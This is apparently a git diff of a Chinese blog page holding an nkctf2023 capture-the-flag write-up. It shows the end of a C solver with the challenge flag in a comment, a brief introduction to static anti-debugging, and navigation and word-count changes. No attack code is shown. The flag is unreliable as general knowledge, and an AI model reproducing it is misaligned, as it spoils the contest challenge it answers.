+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">/*nkctf{056e6b6d614fef7eb0044154700bea9eeb043aa}*/</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="earlier"><a href="#earlier" class="headerlink" title="earlier"></a>earlier</h2><ul>
+<li>静态反调试</li>
+</ul>
+<p>这题加了很多静态反调试，但都可以很容易去除。这里写的详细一点，复习一下静态反调试技术。</p>
+
                 
             </div>
             <hr/>
@@ -881,30 +1040,29 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/04/22/nkctf2023-wp/">
+                <a href="/2023/04/24/hdctf2023-wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="nkctf2023-wp">
+                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="HDCTF2023-WP">
                         
-                        <span class="card-title">nkctf2023-wp</span>
+                        <span class="card-title">HDCTF2023-WP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            nkctf2023赛题复现，只有本地环境
+                            简单记录
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-22
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-24
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -917,7 +1075,6 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -1149,7 +1306,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">53.5k</span>
+                        class="white-color">55.5k</span>
             
             
             
